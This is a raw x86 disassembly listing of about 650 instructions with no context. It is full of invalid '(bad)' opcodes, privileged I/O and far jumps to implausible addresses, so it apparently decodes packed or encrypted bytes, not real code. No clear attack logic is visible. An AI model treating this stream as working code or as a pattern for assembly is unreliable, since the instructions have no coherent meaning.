  40f9fd:	xor    esp,0x944017b7
  40fa03:	xlat   BYTE PTR ds:[ebx]
  40fa04:	push   0xffffffb1
  40fa06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa07:	mov    ebx,0x7c4854cd
  40fa0c:	push   edi
  40fa0d:	mov    ds:0x8c552889,eax
  40fa12:	push   esi
  40fa13:	imul   ecx,DWORD PTR [eax],0x691d1f26
  40fa19:	jo     0x40f9b0
  40fa1b:	xor    ch,ch
  40fa1d:	fiadd  WORD PTR [esi+0x5e]
  40fa20:	or     al,0xf0
  40fa22:	lods   al,BYTE PTR ds:[esi]
  40fa23:	push   si
  40fa25:	push   edi
  40fa26:	mov    ebx,0x795c98f8
  40fa2b:	adc    esp,ebx
  40fa2d:	cs pop eax
  40fa2f:	sub    DWORD PTR [ebp-0x2f5edb],edx
  40fa35:	retf   0x28ca
  40fa38:	push   ebp
  40fa39:	int    0x60
  40fa3b:	push   0x4185a008
  40fa40:	test   DWORD PTR [ebx-0x130bc6a0],eax
  40fa46:	add    BYTE PTR [ebx+0x37],al
  40fa49:	jl     0x40fab9
  40fa4b:	clc    
  40fa4c:	mov    edi,0x882c223f
  40fa51:	es call 0x3a1f185f
  40fa57:	lahf   
  40fa58:	(bad)  
  40fa59:	jno    0x40fa89
  40fa5b:	or     ebx,ebp
  40fa5d:	adc    DWORD PTR [ebp-0x1eb800c0],0x6270d229
  40fa67:	popf   
  40fa68:	or     dh,ch
  40fa6a:	jecxz  0x40fad7
  40fa6c:	mov    ah,0x20
  40fa6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa70:	push   eax
  40fa72:	int3   
  40fa73:	iret   
  40fa74:	xchg   esp,eax
  40fa75:	add    ax,0xd248
  40fa79:	fwait
  40fa7a:	arpl   WORD PTR [esi+0x73804b71],bp
  40fa80:	leave  
  40fa81:	mov    eax,ds:0xf0cd692d
  40fa86:	pop    edx
  40fa87:	or     eax,0xe373ca93
  40fa8c:	cmp    DWORD PTR [esi+0x2bbd6bb],ebx
  40fa92:	xchg   DWORD PTR ds:0xa673d388,edx
  40fa98:	sub    eax,0x78294f59
  40fa9d:	in     al,dx
  40fa9e:	or     al,0x11
  40faa0:	or     DWORD PTR [esi-0x60],edx
  40faa3:	lahf   
  40faa4:	and    DWORD PTR [ebx],edx
  40faa6:	in     eax,dx
  40faa7:	call   DWORD PTR [edx-0xf]
  40faaa:	dec    eax
  40faab:	mov    eax,ds:0xd5636d0f
  40fab0:	sbb    eax,0xe96dea0f
  40fab5:	sbb    al,0x8d
  40fab7:	jmp    0xb8903eca
  40fabc:	dec    ebx
  40fabd:	lock mov cl,0x9c
  40fac0:	inc    esp
  40fac1:	lock imul ah
  40fac4:	inc    esi
  40fac5:	popa   
  40fac6:	xchg   edi,eax
  40fac7:	aam    0x68
  40fac9:	pop    ds
  40faca:	inc    eax
  40facb:	mov    cl,0xad
  40facd:	out    dx,eax
  40face:	or     DWORD PTR ss:[ebp+0x4c],esi
  40fad2:	sub    eax,0x87e3670a
  40fad7:	jne    0x40fb17
  40fad9:	icebp  
  40fada:	xor    BYTE PTR [esi-0x80],dl
  40fadd:	hlt    
  40fade:	jnp    0x40fb40
  40fae0:	int    0xf6
  40fae2:	fdivr  DWORD PTR [ebx]
  40fae4:	dec    edx
  40fae5:	jl     0x40fa6d
  40fae7:	lea    esi,ds:0x776320b6
  40faed:	enter  0x284a,0xc0
  40faf1:	mov    WORD PTR [edx],?
  40faf3:	mov    ds:0xdb8c601e,al
  40faf8:	and    esi,ecx
  40fafa:	idiv   BYTE PTR [ebp+0x68]
  40fafd:	mov    eax,0xccb1bcaf
  40fb02:	sub    ch,BYTE PTR [ecx]
  40fb04:	add    bh,BYTE PTR ds:0x320935b9
  40fb0a:	test   al,0xb5
  40fb0c:	cmp    al,0x5a
  40fb0e:	or     al,0x8a
  40fb10:	mov    al,ds:0x4e888af3
  40fb15:	call   0x86fd:0x11b1ed62
  40fb1c:	or     BYTE PTR [esi-0x592118f9],dh
  40fb22:	clc    
  40fb23:	adc    BYTE PTR [edx],ah
  40fb25:	icebp  
  40fb26:	les    edi,FWORD PTR [eax+0x3b]
  40fb29:	leave  
  40fb2a:	rol    al,cl
  40fb2c:	out    0xfc,al
  40fb2e:	push   ebp
  40fb2f:	mov    al,0xa
  40fb31:	int3   
  40fb32:	jno    0x40fb85
  40fb34:	dec    ebp
  40fb35:	in     al,0x9f
  40fb37:	push   edx
  40fb38:	cwde   
  40fb39:	xchg   ebp,eax
  40fb3a:	and    eax,0x24f16e70
  40fb3f:	int    0x1b
  40fb41:	pushf  
  40fb42:	add    ah,ah
  40fb44:	(bad)  
  40fb45:	into   
  40fb46:	pop    ecx
  40fb47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb48:	shl    DWORD PTR [edi-0x79],cl
  40fb4b:	stc    
  40fb4c:	dec    ebp
  40fb4d:	xchg   al,cl
  40fb4f:	and    esp,edi
  40fb51:	sub    edx,esp
  40fb53:	pop    ebx
  40fb54:	add    al,0x50
  40fb56:	xchg   BYTE PTR [ecx+ebx*4-0x53],dl
  40fb5a:	js     0x40fafc
  40fb5c:	cmp    al,0x1c
  40fb5e:	xchg   BYTE PTR [edi],bh
  40fb60:	mov    ah,0x63
  40fb62:	xor    dl,dl
  40fb64:	jns    0x40fb1d
  40fb66:	sbb    al,0x29
  40fb68:	dec    edi
  40fb69:	hlt    
  40fb6a:	push   esi
  40fb6b:	add    al,0xf7
  40fb6d:	neg    DWORD PTR [esi+0x59c3ac59]
  40fb73:	fs mov ch,0xf0
  40fb76:	push   esp
  40fb77:	lods   al,BYTE PTR ds:[esi]
  40fb78:	pushf  
  40fb79:	jmp    0x40fb5a
  40fb7b:	daa    
  40fb7c:	jo     0x40fbd2
  40fb7e:	push   eax
  40fb7f:	ffree  st(7)
  40fb81:	loope  0x40fb0a
  40fb83:	stc    
  40fb84:	xchg   edx,eax
  40fb85:	cmp    al,0x67
  40fb87:	lods   eax,DWORD PTR ds:[esi]
  40fb88:	or     ecx,ecx
  40fb8a:	sti    
  40fb8b:	sub    BYTE PTR [eax+edx*8+0x15],bh
  40fb8f:	or     BYTE PTR ds:[esi],dh
  40fb92:	cmp    BYTE PTR [ebx-0x3cca3c7c],0xdd
  40fb99:	icebp  
  40fb9a:	mov    edx,0x9d834858
  40fb9f:	xchg   DWORD PTR [edi-0x5e66faa5],ebp
  40fba5:	scas   al,BYTE PTR es:[edi]
  40fba6:	xchg   BYTE PTR [ebp+0x24c39404],bl
  40fbac:	push   cs
  40fbad:	lock (bad) 
  40fbaf:	into   
  40fbb0:	push   ss
  40fbb1:	sbb    BYTE PTR [ebx],0x4
  40fbb4:	push   ebx
  40fbb5:	jge    0x40fbe8
  40fbb7:	adc    eax,DWORD PTR [ecx+0x3e]
  40fbba:	test   DWORD PTR [ebx],ebp
  40fbbc:	pop    eax
  40fbbd:	xchg   DWORD PTR [edi],eax
  40fbbf:	sub    bl,BYTE PTR [ebx-0x10]
  40fbc2:	jle    0x40fc2a
  40fbc4:	aad    0xf4
  40fbc6:	hlt    
  40fbc7:	jecxz  0x40fbe8
  40fbc9:	bound  edi,QWORD PTR [esi]
  40fbcb:	in     al,0x90
  40fbcd:	or     DWORD PTR [ecx-0x181e31ff],eax
  40fbd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbd4:	mov    eax,ds:0x306a86cb
  40fbd9:	jo     0x40fb8f
  40fbdb:	into   
  40fbdc:	inc    esp
  40fbdd:	punpckhbw mm7,QWORD PTR [ebp+0x8]
  40fbe1:	dec    esi
  40fbe2:	(bad)  
  40fbe3:	jae    0x40fc45
  40fbe5:	jo     0x40fc09
  40fbe7:	inc    ebp
  40fbe8:	(bad)  
  40fbe9:	xor    al,0x35
  40fbeb:	dec    esi
  40fbec:	inc    ecx
  40fbed:	loop   0x40fc0e
  40fbef:	sub    esi,esp
  40fbf1:	sub    dl,ah
  40fbf3:	pop    esp
  40fbf4:	repz out dx,al
  40fbf6:	pop    eax
  40fbf7:	xchg   ecx,eax
  40fbf8:	push   ds
  40fbf9:	fiadd  WORD PTR [edi+0x1d918bd9]
  40fbff:	or     DWORD PTR [ecx],eax
  40fc01:	cmovns ebp,DWORD PTR [ecx]
  40fc04:	xor    BYTE PTR ds:0x98258fce,al
  40fc0a:	imul   ecx,DWORD PTR [eax-0x1ff90df8],0x6b
  40fc11:	fcom   DWORD PTR [ebx]
  40fc13:	je     0x40fc22
  40fc15:	ror    ebx,0x2e
  40fc18:	mov    esp,0x15ee4ccc
  40fc1d:	fwait
  40fc1e:	push   edi
  40fc1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc20:	hlt    
  40fc21:	or     DWORD PTR [edi-0xfdb7dd5],eax
  40fc27:	outs   dx,BYTE PTR ds:[esi]
  40fc28:	popf   
  40fc29:	les    ecx,FWORD PTR [ebx+edx*1-0x29]
  40fc2d:	out    dx,eax
  40fc2e:	pusha  
  40fc2f:	in     eax,0x88
  40fc31:	sub    edi,DWORD PTR [esi+0xd0a7e15]
  40fc37:	inc    esp
  40fc38:	add    ebx,esi
  40fc3a:	lock pop ecx
  40fc3c:	mov    esp,0xd810dfd6
  40fc41:	mov    ebx,0xd791bc6f
  40fc46:	call   0x4524:0xfdfeb2b
  40fc4d:	push   ecx
  40fc4e:	xchg   ebp,eax
  40fc4f:	stos   BYTE PTR es:[edi],al
  40fc50:	or     DWORD PTR [edx+0x7f],esp
  40fc53:	and    DWORD PTR [eax],0x6b
  40fc56:	push   edi
  40fc57:	test   BYTE PTR [eax],0xff
  40fc5a:	hlt    
  40fc5b:	ins    BYTE PTR es:[edi],dx
  40fc5c:	push   0xffffffe7
  40fc5e:	xchg   edx,eax
  40fc5f:	xchg   esp,eax
  40fc60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc61:	add    al,0x2e
  40fc63:	leave  
  40fc64:	outs   dx,BYTE PTR ss:[esi]
  40fc66:	jno    0x40fc1b
  40fc68:	or     DWORD PTR [ecx+ecx*8-0x67],esi
  40fc6c:	mov    bh,BYTE PTR [eax]
  40fc6e:	nop
  40fc6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc70:	jecxz  0x40fbff
  40fc72:	les    eax,FWORD PTR ds:[ecx]
  40fc75:	jl     0x40fc42
  40fc77:	sbb    eax,0x66fbf011
  40fc7c:	fcom   st(0)
  40fc7e:	xchg   esi,eax
  40fc7f:	sub    BYTE PTR [esp+edi*1-0x68],bl
  40fc83:	ins    DWORD PTR es:[edi],dx
  40fc84:	adc    BYTE PTR ds:[ebx+0x32f1c4e9],cl
  40fc8b:	jmp    0x3bbe:0xde8bb08a
  40fc92:	rcr    esp,1
  40fc94:	or     BYTE PTR [edx+0x292e6c7e],bl
  40fc9a:	jne    0x40fcdc
  40fc9c:	sbb    eax,0x5123def0
  40fca1:	ret    
  40fca2:	mov    gs,WORD PTR ds:0xf20efec3
  40fca8:	or     BYTE PTR [esi-0x9],dl
  40fcab:	inc    esp
  40fcac:	outs   dx,BYTE PTR ds:[esi]
  40fcad:	pmuludq mm1,QWORD PTR [ecx-0x59]
  40fcb1:	lock ds jmp 0x40fc78
  40fcb5:	add    DWORD PTR [edi-0x45331d0b],esi
  40fcbb:	push   edx
  40fcbc:	push   esi
  40fcbd:	sub    eax,DWORD PTR [edi-0x55ae4605]
  40fcc3:	pop    ds
  40fcc4:	mov    al,ds:0xf91643e
  40fcc9:	jge    0x40fc51
  40fccb:	jae    0x40fc6f
  40fccd:	std    
  40fcce:	jno    0x40fd37
  40fcd0:	cmc    
  40fcd1:	mov    dh,0xbe
  40fcd3:	inc    edi
  40fcd4:	retf   0x87c8
  40fcd7:	push   ecx
  40fcd8:	mov    dh,0xf1
  40fcda:	push   0x7
  40fcdc:	mov    WORD PTR [esp+esi*4-0x78],ds
  40fce0:	mov    dl,0xdc
  40fce2:	mov    al,ds:0x86bf404f
  40fce7:	cmp    eax,0xb878b344
  40fcec:	aaa    
  40fced:	cmp    eax,0x8fbc5b15
  40fcf2:	xchg   BYTE PTR [ebx+0x54],al
  40fcf5:	cdq    
  40fcf6:	(bad)  
  40fcf7:	mov    ds:0xff8419f0,eax
  40fcfc:	xor    al,0x2a
  40fcfe:	cdq    
  40fcff:	leave  
  40fd00:	and    ecx,esi
  40fd02:	jle    0x40fd1c
  40fd04:	lea    esp,[esi+eiz*4]
  40fd07:	shl    DWORD PTR [eax],0x49
  40fd0a:	not    DWORD PTR [eax]
  40fd0c:	nop
  40fd0d:	aad    0x86
  40fd0f:	dec    ecx
  40fd10:	sbb    BYTE PTR [edi-0x7efceb2],cl
  40fd16:	cwde   
  40fd17:	shl    BYTE PTR [eax+0x1f],0x39
  40fd1b:	aad    0x44
  40fd1d:	in     al,0x83
  40fd1f:	sub    DWORD PTR [ecx],ecx
  40fd21:	mov    dh,0xfa
  40fd23:	cdq    
  40fd24:	enter  0xccd8,0xa2
  40fd28:	in     al,dx
  40fd29:	xchg   BYTE PTR [esi+edi*2+0x8],dl
  40fd2d:	clc    
  40fd2e:	hlt    
  40fd2f:	hlt    
  40fd30:	push   ebp
  40fd31:	and    BYTE PTR [ebx+edx*8+0x4d10e871],dl
  40fd38:	jbe    0x40fce3
  40fd3a:	dec    edx
  40fd3b:	sub    bl,al
  40fd3d:	std    
  40fd3e:	pop    edx
  40fd3f:	mov    eax,0x21aad6eb
  40fd44:	div    BYTE PTR [ecx+0x7d]
  40fd47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd48:	pop    ss
  40fd49:	inc    esp
  40fd4a:	call   0xa92b:0xf8f1c448
  40fd51:	aad    0xe1
  40fd53:	out    dx,al
  40fd54:	jne    0x40fd6f
  40fd56:	xor    ebp,DWORD PTR [ecx+edi*4]
  40fd59:	out    dx,al
  40fd5a:	add    ch,BYTE PTR [eax]
  40fd5c:	jle    0x40fd9b
  40fd5e:	cdq    
  40fd5f:	div    DWORD PTR cs:[ebx]
  40fd62:	adc    eax,0x56368a13
  40fd67:	sbb    ch,BYTE PTR [ebp+0x0]
  40fd6a:	xor    al,0x3c
  40fd6c:	push   edi
  40fd6d:	popa   
  40fd6e:	imul   DWORD PTR [ecx]
  40fd70:	sbb    dl,BYTE PTR [esi+0x5d]
  40fd73:	ins    DWORD PTR es:[edi],dx
  40fd74:	js     0x40fdf5
  40fd76:	xor    bl,dl
  40fd78:	in     al,dx
  40fd79:	int3   
  40fd7a:	hlt    
  40fd7b:	ror    DWORD PTR [eax-0x354b4a47],1
  40fd81:	inc    eax
  40fd82:	sbb    DWORD PTR [ebp+0x1b],edx
  40fd85:	push   esp
  40fd86:	sahf   
  40fd87:	aaa    
  40fd88:	dec    ecx
  40fd89:	test   BYTE PTR [ecx],0xb5
  40fd8c:	shr    BYTE PTR [edi],1
  40fd8e:	sti    
  40fd8f:	adc    DWORD PTR ds:0x77358f50,edi
  40fd95:	ja     0x40fd9c
  40fd97:	pop    eax
  40fd98:	jbe    0x40fd8b
  40fd9a:	mov    ds:0x109da463,al
  40fd9f:	aad    0x28
  40fda1:	mov    edx,0xff9b0ba
  40fda6:	(bad)  
  40fda7:	jae    0x40fd54
  40fda9:	sub    al,BYTE PTR [eax-0xa0e37e5]
  40fdaf:	clc    
  40fdb0:	fcomip st,st(1)
  40fdb2:	adc    edx,DWORD PTR es:0x22388803
  40fdb9:	outs   dx,BYTE PTR ds:[esi]
  40fdba:	lea    edi,[edx-0x746a5658]
  40fdc0:	mov    WORD PTR [ecx+0x18],?
  40fdc3:	aaa    
  40fdc4:	or     edx,DWORD PTR [eax]
  40fdc6:	imul   esi,DWORD PTR [ecx],0xffffffe7
  40fdc9:	fbstp  TBYTE PTR [esi-0x1e9b81d8]
  40fdcf:	jne    0x40fddb
  40fdd1:	aam    0xf
  40fdd3:	sbb    al,0x1
  40fdd5:	daa    
  40fdd6:	pop    ds
  40fdd7:	cmp    eax,0xb5cbbac9
  40fddc:	pop    ds
  40fddd:	sub    ebp,edx
  40fddf:	sub    ebp,DWORD PTR [eax+edx*8+0x2349d30f]
  40fde6:	in     al,dx
  40fde7:	mov    dh,0x75
  40fde9:	clc    
  40fdea:	xlat   BYTE PTR ds:[ebx]
  40fdeb:	outs   dx,DWORD PTR ds:[esi]
  40fdec:	mov    ds:0xb0298d50,eax
  40fdf1:	pop    esp
  40fdf2:	jno    0x40fde3
  40fdf4:	in     eax,0xa
  40fdf6:	std    
  40fdf7:	sub    bh,ch
  40fdf9:	mov    ch,0x13
  40fdfb:	loope  0x40fe06
  40fdfd:	ins    BYTE PTR es:[edi],dx
  40fdfe:	jnp    0x40fdac
  40fe00:	lds    edi,FWORD PTR [esi+edx*4]
  40fe03:	sbb    eax,0xc580f0b5
  40fe08:	in     al,dx
  40fe09:	adc    DWORD PTR [ebx],esp
  40fe0b:	icebp  
  40fe0c:	je     0x40fe36
  40fe0e:	pop    ecx
  40fe0f:	push   edx
  40fe10:	loope  0x40fdde
  40fe12:	outs   dx,DWORD PTR ds:[esi]
  40fe13:	into   
  40fe14:	jle    0x40fe6d
  40fe16:	xchg   edi,edx
  40fe18:	out    0x2a,eax
  40fe1a:	(bad)  
  40fe1b:	dec    eax
  40fe1c:	inc    edi
  40fe1d:	dec    esi
  40fe1e:	adc    ebp,DWORD PTR [ebx]
  40fe20:	mov    ds:0x3dbf0741,eax
  40fe25:	inc    edx
  40fe26:	fnsave [eax-0xe7667e9]
  40fe2c:	not    ecx
  40fe2e:	int3   
  40fe2f:	add    BYTE PTR [edi-0x10],dl
  40fe32:	(bad)  
  40fe33:	stos   BYTE PTR es:[edi],al
  40fe34:	std    
  40fe35:	jp     0x40feb1
  40fe37:	sub    eax,0xd7b767de
  40fe3c:	xchg   edx,eax
  40fe3e:	xchg   BYTE PTR [ebp-0x74],bl
  40fe41:	push   esp
  40fe42:	push   es
  40fe43:	add    DWORD PTR [ebp+0x21285ec8],eax
  40fe49:	pop    ds
  40fe4a:	test   eax,0xdd640830
  40fe4f:	lock lds ebp,FWORD PTR [ecx-0xf5f0ce2]
  40fe56:	add    al,0x95
  40fe58:	mov    dh,0xf8
  40fe5a:	mov    BYTE PTR [edx+0x38],dl
  40fe5d:	adc    esp,DWORD PTR [edi+edx*8+0x519431da]
  40fe64:	xchg   esp,eax
  40fe65:	jo     0x40fe26
  40fe67:	sub    DWORD PTR [ebx-0x71fb4b0f],ecx
  40fe6d:	scas   eax,DWORD PTR es:[edi]
  40fe6e:	popf   
  40fe6f:	repnz (bad) 
  40fe71:	out    dx,eax
  40fe72:	shl    BYTE PTR [ebx+0x4d],1
  40fe75:	inc    edi
  40fe76:	xchg   DWORD PTR [ecx+0x1da7d887],edi
  40fe7c:	ins    DWORD PTR es:[edi],dx
  40fe7d:	test   BYTE PTR [esi+0x7],dl
  40fe80:	pop    ebp
  40fe81:	mov    ebx,0x5be7294d
  40fe86:	test   dh,dh
  40fe88:	inc    esi
  40fe89:	lods   eax,DWORD PTR ds:[esi]
  40fe8a:	xchg   DWORD PTR [edi],ebp
  40fe8c:	jb     0x40fe2c
  40fe8e:	mov    ah,0x3b
  40fe90:	(bad)  
  40fe92:	pop    ebp
  40fe93:	daa    
  40fe94:	mov    esi,0xc60ec790
  40fe99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe9a:	mov    BYTE PTR [eax+0x6d8687a5],al
  40fea0:	cld    
  40fea1:	mov    eax,0x9e89794a
  40fea6:	jecxz  0x40fec9
  40fea8:	outs   dx,BYTE PTR ds:[esi]
  40fea9:	jno    0x40feac
  40feab:	xlat   BYTE PTR ds:[ebx]
  40feac:	push   ds
  40fead:	fcomp  QWORD PTR [ebx+0x2a]
  40feb0:	or     edx,eax
  40feb2:	jno    0x40fe63
  40feb4:	mov    ch,0x9f
  40feb6:	cmp    al,0x87
  40feb8:	(bad)  
  40feb9:	adc    eax,0x834725d6
  40febe:	dec    edx
  40febf:	sub    bl,bh
  40fec1:	jns    0x40fe7c
  40fec3:	jmp    0x40fece
  40fec5:	mov    esp,0x4e92bfbb
  40feca:	pop    edx
  40fecb:	sbb    ah,BYTE PTR [ebp+0x4d70e8f1]
  40fed1:	jo     0x40fee6
  40fed3:	ja     0x40feb8
  40fed5:	stos   BYTE PTR es:[edi],al
  40fed6:	mov    ?,WORD PTR [ebx-0x6a783dd1]
  40fedc:	ja     0x40ff4d
  40fede:	out    0x99,eax
  40fee0:	scas   eax,DWORD PTR es:[edi]
  40fee1:	lock div ch
  40fee4:	cmp    eax,ecx
  40fee6:	add    eax,0xfe06dfd9
  40feeb:	in     eax,0x1f
  40feed:	push   edi
  40feee:	xchg   DWORD PTR [ebx],edi
  40fef0:	mov    BYTE PTR [ebx],bh
  40fef2:	mov    dl,0x20
  40fef4:	dec    edi
  40fef5:	adc    eax,0xdec83687
  40fefa:	sbb    dh,BYTE PTR [edx-0x38]
  40fefd:	xor    bh,BYTE PTR [eax-0xf937d]
  40ff03:	ja     0x40fecc
  40ff05:	sub    DWORD PTR [esi+0x728aa4d1],ecx
  40ff0b:	aaa    
  40ff0c:	or     BYTE PTR [ecx],ah
  40ff0e:	mov    BYTE PTR [edx-0x4339a53d],dl
  40ff14:	not    DWORD PTR [ecx-0x37e4ef3e]
  40ff1a:	mov    ebx,0xc83dab9
  40ff1f:	mov    eax,ds:0xfab2c508
  40ff24:	loopne 0x40ff3a
  40ff26:	ja     0x40fee5
  40ff28:	or     BYTE PTR [eax],dl
  40ff2a:	(bad)  
  40ff2c:	add    cl,ch
  40ff2e:	out    0x6f,eax
  40ff30:	imul   esi,ecx,0xdeda0994
  40ff36:	sbb    DWORD PTR ds:0x54cb13da,edi
  40ff3c:	test   BYTE PTR [ebx-0x79],bh
  40ff3f:	mov    ebx,0xcf3af398
  40ff44:	xchg   ecx,eax
  40ff45:	push   ds
  40ff46:	pop    ecx
  40ff47:	adc    BYTE PTR [ebx+0x54],bh
  40ff4a:	jb     0x40ff75
  40ff4c:	dec    esi
  40ff4d:	push   ebx
  40ff4e:	push   ecx
  40ff4f:	test   ah,al
  40ff51:	mov    WORD PTR [esi+0x1450861d],es
  40ff57:	ficomp WORD PTR [ebp-0x6dd76f00]
  40ff5d:	fcom   DWORD PTR [edi-0x7d]
  40ff60:	or     BYTE PTR [ecx+ebp*1+0x3e659bd3],ch
  40ff67:	(bad)  
  40ff68:	lods   eax,DWORD PTR ds:[esi]
  40ff69:	lock push cs
  40ff6b:	loopne 0x40ffd2
  40ff6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff6e:	push   eax
  40ff6f:	mov    DWORD PTR [edi+0x5b],ebp
  40ff72:	jmp    0x2917:0x9b769a2e
  40ff79:	addr16 xor eax,0x3f03ae3
  40ff7f:	cld    
  40ff80:	stc    
  40ff81:	(bad)  
  40ff82:	out    0xdc,al
  40ff84:	sub    DWORD PTR [ecx+0x4c5e29ff],esp
  40ff8a:	lock cmc 
  40ff8c:	icebp  
  40ff8d:	push   es
  40ff8e:	push   eax
  40ff8f:	(bad)
  40ff93:	addr16 adc eax,0x10b958d0
  40ff99:	push   DWORD PTR [edx]
  40ff9b:	into   
  40ff9c:	push   ds
  40ff9d:	fild   WORD PTR [esi+0x6e]
  40ffa0:	inc    esp
  40ffa1:	dec    ecx
  40ffa2:	hlt    
  40ffa3:	call   0xf317d1b1
  40ffa8:	sub    ch,BYTE PTR [ecx]
  40ffaa:	push   eax
  40ffab:	int    0x86
  40ffad:	icebp  
  40ffae:	retf   0x468b
  40ffb1:	push   ecx
  40ffb2:	ret    
  40ffb3:	(bad)  
  40ffb4:	mov    cl,0x5e
  40ffb6:	sbb    eax,0x874db6c5
  40ffbb:	mov    ds:0x5530ca26,eax
  40ffc0:	inc    esp
  40ffc1:	lock mov eax,0x7844f7ca
  40ffc7:	sub    al,0xa2
  40ffc9:	cwde   
  40ffca:	mov    ebp,ebx
  40ffcc:	fucomp st(3)
  40ffce:	xchg   DWORD PTR [ebx+0xa],ebx
  40ffd1:	push   ecx
  40ffd2:	loop   0x40ffec
  40ffd4:	stc    
  40ffd5:	ret    0x2961
  40ffd8:	sti    
  40ffd9:	std    
  40ffda:	ins    BYTE PTR es:[edi],dx
  40ffdb:	jl     0x40ffe6
  40ffdd:	or     ch,ch
  40ffdf:	cwde   
  40ffe0:	pop    es
  40ffe1:	icebp  
  40ffe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe4:	add    bl,BYTE PTR ss:[esi]
  40ffe7:	gs jp  0x40ffdb
  40ffea:	aam    0xd5
  40ffec:	pusha  
  40ffed:	mov    eax,cs:0xdd538cb5
  40fff3:	(bad)  
  40fff5:	imul   edi,DWORD PTR [edi-0x799137fb],0x44cbae21
  40ffff:	icebp  
  410000:	daa    
  410001:	ja     0x40ffde
  410003:	adc    DWORD PTR cs:[ebp+0x653c08e6],edi
  41000a:	mov    bh,0xa
  41000c:	scas   eax,DWORD PTR es:[edi]
  41000d:	mov    ch,0x86
  41000f:	sub    ecx,DWORD PTR [edx-0x2a60826a]
  410015:	mov    al,0x3f
  410017:	sub    BYTE PTR [eax],al
  410019:	xchg   edx,eax
  41001a:	loop   0x41004f
  41001c:	adc    al,0x10
  41001e:	outs   dx,BYTE PTR ds:[esi]
  41001f:	inc    ebp
  410020:	pop    ds
  410021:	xor    DWORD PTR [ecx],esi
  410023:	mov    dh,BYTE PTR [ebx]
  410025:	jo     0x41008a
  410027:	jnp    0x41007e
  410029:	fdiv   st(0),st
  41002b:	int    0x2a
  41002d:	icebp  
  41002e:	adc    dl,BYTE PTR [esi]
  410030:	inc    edi
  410031:	mov    edx,0xa9f7a1f2
  410036:	cwde   
  410037:	pop    esi
  410038:	cmp    eax,0xd2b060ce
  41003d:	icebp  
  41003e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41003f:	mov    bl,0x5
  410041:	stc    
  410042:	push   ebp
  410043:	popf   
  410044:	gs mov eax,0x525b1536
  41004a:	xchg   DWORD PTR [ebx+0x78],edx
  41004d:	mov    BYTE PTR [ebx-0x66],al
  410050:	ins    DWORD PTR es:[edi],dx
  410051:	adc    eax,0x81015b7f
  410056:	xchg   DWORD PTR ds:0x84e88b9a,ebx
  41005c:	inc    ebp
  41005d:	mov    DWORD PTR [esi-0x7b206e2d],0x49261197
  410067:	sub    DWORD PTR [ebx-0x80],edx
  41006a:	xchg   edi,eax
  41006b:	imul   ebp,DWORD PTR [eax+0x7e],0xffffffa0
  41006f:	nop
  410070:	cdq    
  410071:	add    al,0x5c
  410073:	ins    BYTE PTR es:[edi],dx
  410074:	mov    ebx,0x695bf415
  410079:	pop    esp
  41007a:	xchg   DWORD PTR [edi],edx
  41007c:	mov    al,ds:0xaf19698
  410081:	mov    BYTE PTR [ecx+0x6b],bh
  410084:	fsubp  st(0),st
  410086:	jecxz  0x41004a
  410088:	push   0x1f71fbc2
  41008d:	rcl    BYTE PTR [edx*1+0x274fcd67],1
  410094:	jno    0x4100ea
  410096:	lea    ebp,[eax+0x1dd2fdf7]
  41009c:	xchg   ebp,eax
  41009d:	inc    edx
  41009e:	sti    
  41009f:	cld    
  4100a0:	xor    al,0x1c
  4100a3:	iret   
  4100a4:	rol    BYTE PTR [edi+0x4830f8f0],cl
  4100aa:	fs in  al,0x20
  4100ad:	cmc    
  4100ae:	xchg   DWORD PTR [edi],eax
  4100b0:	mov    DWORD PTR [ecx-0x1de86a1d],edx
  4100b6:	jae    0x4100e0
  4100b8:	push   eax
  4100b9:	xor    BYTE PTR [ecx],ch
  4100bb:	test   bh,dh
  4100bd:	ins    DWORD PTR es:[edi],dx
  4100be:	inc    esp
  4100bf:	dec    ecx
  4100c0:	jl     0x41011e
  4100c2:	int    0x2b
  4100c4:	in     eax,0xf1
  4100c6:	jo     0x410090
  4100c8:	lods   eax,DWORD PTR ds:[esi]
  4100c9:	retf   0xe47f
  4100cc:	loopne 0x410089
  4100ce:	mov    edi,edi
  4100d0:	and    edx,DWORD PTR [edx-0x32]
  4100d3:	push   ecx
  4100d4:	add    al,0xa2
  4100d6:	xchg   bl,dh
  4100d8:	in     eax,0xf1
  4100da:	mov    esi,0xfe69634c
  4100df:	ds xor eax,0x2abcc3e3
  4100e5:	inc    eax
  4100e6:	xchg   BYTE PTR [ebp+0x66],dl
  4100e9:	xchg   esp,eax
  4100ea:	mov    ch,0xc7
  4100ec:	out    dx,eax
  4100ed:	jge    0x410144
  4100ef:	push   ecx
  4100f0:	addr16 push eax
  4100f2:	jbe    0x410152
  4100f4:	push   edx
  4100f5:	xchg   DWORD PTR ds:0x9ffd2028,esp
  4100fc:	xchg   DWORD PTR [ecx-0x27212e0c],eax
  410102:	sub    BYTE PTR fs:[edx+ebp*4-0x74],dh
  410107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410108:	pop    edi
  410109:	addr16 mov esi,0x53b5ab29
  41010f:	int3   
  410110:	call   0x7e3ac710
  410115:	jno    0x41009e
  410117:	inc    ebx
  410118:	cli    
  410119:	xchg   esi,eax
  41011a:	int    0xbd
  41011c:	cmc    
  41011d:	je     0x4100a3
  41011f:	sub    BYTE PTR [edx+0x312c9b0f],ch
  410125:	loop   0x4100bd
  410127:	sub    cl,BYTE PTR [eax]
  410129:	stos   DWORD PTR es:[edi],eax
  41012a:	stc    
  41012b:	add    ebx,ecx
  41012d:	aam    0x33
  41012f:	outs   dx,BYTE PTR ds:[esi]
  410130:	stc    
  410131:	test   BYTE PTR [ecx],bh
